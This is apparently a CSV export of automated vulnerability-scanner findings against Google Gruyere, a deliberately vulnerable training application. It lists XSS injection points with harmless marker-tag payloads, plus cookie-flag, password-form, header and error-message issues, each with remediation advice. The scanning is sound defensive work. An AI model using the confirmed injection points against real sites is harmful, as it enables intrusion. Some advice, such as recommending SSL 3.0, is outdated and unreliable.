asset.id,asset.name,"definition.cvss2.base_score","definition.cvss2.base_vector","definition.cvss3.base_score","definition.cvss3.base_vector",definition.description,definition.family,definition.id,definition.name,"definition.patch_published","definition.plugin_published","definition.plugin_updated",definition.references,definition.see_also,definition.severity,definition.solution,"definition.vulnerability_published",finding_id,first_observed,last_observed,output,risk_modified,severity,state
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"d0f8d0b1-0014-4b63-9b29-2169713b0f1c",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"A response has been received with a response code '400' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP GET request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"d4342eb2-1241-4e7e-8625-dfeb0f69333c",2022-03-15T18:42:41.743Z,2022-03-15T17:55:19Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet2' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"d5ea1039-7083-47bc-91b9-7f0361496667",2022-03-15T21:06:17.432Z,2022-03-15T17:46:38Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/563265819128830739647592760263700851280/login with input fields : 
- uid (text)
- pw (password)

This form is submitted by using the following action : https://google-gruyere.appspot.com/563265819128830739647592760263700851280/login",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.0,"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N",5.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","The HTTP protocol by itself is clear text, meaning that any data that is transmitted via HTTP can be captured and the contents viewed.

To keep data private, and prevent it from being intercepted, HTTP is often tunnelled through either Secure Sockets Layer (SSL), or Transport Layer Security (TLS). When either of these encryption standards are used it is referred to as HTTPS.

Cyber-criminals will often attempt to compromise credentials passed from the client to the server using HTTP. This can be conducted via various different Man-in-The-Middle (MiTM) attacks or through network packet captures.

Scanner discovered that the affected page contains a `password` input, however, the value of the field is not sent to the server utilising HTTPS. Therefore it is possible that any submitted credential may become compromised.","Authentication & Session",98082,"Unencrypted Password Form",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[319, 523], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","http://www.owasp.org/index.php/Top_10_2010-A9-Insufficient_Transport_Layer_Protection",Medium,"The affected site should be secured utilising the latest and most secure encryption protocols. These include SSL version 3.0 and TLS version 1.2. While TLS 1.2 is the latest and the most preferred protocol, not all browsers will support this encryption method. Therefore, the more common SSL is included. Older protocols such as SSL version 2, and weak ciphers (< 128 bit) should also be disabled.",,"d60e51a9-c6ca-4e29-89cf-be58b91b6357",2022-03-15T18:42:41.743Z,2022-03-15T17:38:44Z,"The scanner detected the presence of a form containing a password field which is transmitted to the target application without using an encrypted channel (HTTPS).",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"d639ab38-e038-4976-a9cc-1bf27f199067",2022-03-15T21:06:17.432Z,2022-03-15T15:34:38Z,"On http://google-gruyere.appspot.com/563265819128830739647592760263700851280/newaccount.gtl debug error messages were detected. Please see the attached response for full details.
<b>WARNING: Gruyere is not secure.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"d8606668-d56f-4f19-8b18-05fecae46aa1",2022-03-15T21:06:17.432Z,2022-03-15T15:34:35Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/563265819128830739647592760263700851280/newaccount.gtl with input fields : 
- action (hidden)
- uid (text)
- pw (password)
- is_author (hidden)

This form is submitted by using the following action : http://google-gruyere.appspot.com/563265819128830739647592760263700851280/saveprofile",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","The HttpOnly flag assists in the prevention of client side-scripts (such as JavaScript) from accessing and using the cookie.

This can help prevent XSS attacks from targeting the cookies holding the client's session token (setting the HttpOnly flag does not prevent, nor safeguard against XSS vulnerabilities themselves).","Web Applications",98063,"Cookie Without HttpOnly Flag Detected",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A5], cwe=[1004], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/HttpOnly",Low,"The initial step to remedy this would be to determine whether any client-side scripts (such as JavaScript) need to access the cookie and if not, set the HttpOnly flag.
It should be noted that some older browsers are not compatible with the HttpOnly flag; therefore, setting this flag will not protect those clients against this form of attack.",,"d88d1c6c-b275-4a8d-a5fa-2f0ef403fcea",2022-03-15T18:42:41.743Z,2022-03-15T16:59:28Z,"The scanner detected a cookie named 'GRUYERE' that does not set the HttpOnly flag.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"d91a7840-79b9-47db-b613-40e9b38f1e8e",2022-03-15T21:06:17.432Z,2022-03-15T14:31:13Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/upload2' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The Expect-CT header allows sites to opt in to reporting and or enforcement of Certificate Transparency requirements, which prevents the use of misissued certificates for that site from going unnoticed. This URL is flagged as a specific example.

The Expect-CT will likely become obsolete in June 2021. Since May 2018 new certificates are expected to support SCTs by default. Certificates before March 2018 were allowed to have a lifetime of 39 months, those will all be expired in June 2021.","HTTP Security Header",98612,"Missing 'Expect-CT' Header",,2019-05-29T00:00:00Z,2021-06-16T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[693], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT",Info,"If your certificate supports SCT (Signed Certificate Timestamp) by default, the Expect-CT header is not required.",,"da1737ce-b3a5-430a-ab0f-99f1c2a25eb4",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"The Expect-CT header was not detected on http://google-gruyere.appspot.com/361357029172560933265350706939995878846/",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"da73e53a-5c9d-4d63-84ba-575528c924a1",2022-03-15T21:06:17.432Z,2022-03-15T14:01:00Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"dc92bde7-08c9-404e-bf07-08b57c022c16",2022-03-15T21:06:17.432Z,2022-03-15T17:51:47Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/563265819128830739647592760263700851280/saveprofile"">
  <input type=""hidden"" name=""action"" value=""new"">
  </input>
  <input type=""text"" name=""uid"" value="""" maxlength=""16"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""hidden"" name=""is_author"" value=""True"">
  </input>
  <input type=""submit"" value=""Create account"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","The HttpOnly flag assists in the prevention of client side-scripts (such as JavaScript) from accessing and using the cookie.

This can help prevent XSS attacks from targeting the cookies holding the client's session token (setting the HttpOnly flag does not prevent, nor safeguard against XSS vulnerabilities themselves).","Web Applications",98063,"Cookie Without HttpOnly Flag Detected",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A5], cwe=[1004], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/HttpOnly",Low,"The initial step to remedy this would be to determine whether any client-side scripts (such as JavaScript) need to access the cookie and if not, set the HttpOnly flag.
It should be noted that some older browsers are not compatible with the HttpOnly flag; therefore, setting this flag will not protect those clients against this form of attack.",,"dce5a8a6-87a0-46e0-8943-781068db5fa0",2022-03-15T21:06:17.432Z,2022-03-15T13:51:13Z,"The scanner detected a cookie named 'GRUYERE' that does not set the HttpOnly flag.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","When the `secure` flag is set on a cookie, the browser will prevent it from being sent over a clear text channel (HTTP) and only allow it to be sent when an encrypted channel is used (HTTPS).

The scanner discovered that a cookie was set by the server without the secure flag being set. Although the initial setting of this cookie was via an HTTPS connection, any HTTP link to the same server will result in the cookie being sent in clear text.

Note that if the cookie does not contain sensitive information, the risk of this vulnerability is mitigated.","Web Applications",98064,"Cookie Without Secure Flag Detected",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A5], cwe=[614], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","https://www.owasp.org/index.php/SecureFlag",Low,"If the cookie contains sensitive information, then the server should ensure that the cookie has the `secure` flag set.",,"de81ee3b-3dc6-4ff3-bac3-754f65195bd8",2022-03-15T18:42:41.743Z,2022-03-15T18:03:22Z,"The scanner detected a cookie named 'GRUYERE' without the Secure flag set.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The HTTP 'X-XSS-Protection' response header is a feature of modern browsers that allows websites to control their XSS auditors.

The server is not configured to return a 'X-XSS-Protection' header which means that any pages on this website could be at risk of a Cross-Site Scripting (XSS) attack. This URL is flagged as a specific example.

If legacy browsers support is not needed, it is recommended to use Content-Security-Policy without allowing unsafe-inline scripts instead.","HTTP Security Header",112526,"Missing 'X-XSS-Protection' Header",,2018-11-27T00:00:00Z,2021-03-12T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#xxxsp, https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection",Info,"Configure your web server to include an 'X-XSS-Protection' header with a value of '1; mode=block' on all pages.",,"df162adb-2562-478b-ae0b-3e427f62047f",2022-03-15T18:42:41.743Z,2022-03-15T17:10:58Z,"The scanner detected the lack of X-XSS-Protection header in the target application response.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"df81a57e-34f3-4056-9cbf-b29795bba131",2022-03-15T18:42:41.743Z,2022-03-15T18:06:22Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/resetbutton/425575187579520270957883614548769509881 with input fields : 
- g-recaptcha-response (no type specified)

This form is submitted by using the following action : https://google-gruyere.appspot.com/resetbutton/425575187579520270957883614548769509881",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"e0748522-0b19-4eea-9d26-fe42f95bf9db",2022-03-15T21:06:17.432Z,2022-03-15T19:58:06Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/656501648683287335357107855369111942818/newaccount.gtl with input fields : 
- action (hidden)
- uid (text)
- pw (password)
- is_author (hidden)

This form is submitted by using the following action : https://google-gruyere.appspot.com/656501648683287335357107855369111942818/saveprofile",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"e0e7a4a8-2694-40c7-b778-d0781e7b54ac",2022-03-15T18:42:41.743Z,2022-03-15T16:47:10Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/feed.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"e237660d-8c0e-4c99-acc6-d0ce4edf54f3",2022-03-15T18:42:41.743Z,2022-03-15T16:54:41Z,"On http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newaccount.gtl debug error messages were detected. Please see the attached response for full details.
<b>WARNING: Gruyere is not secure.",NONE,Info,ACTIVE
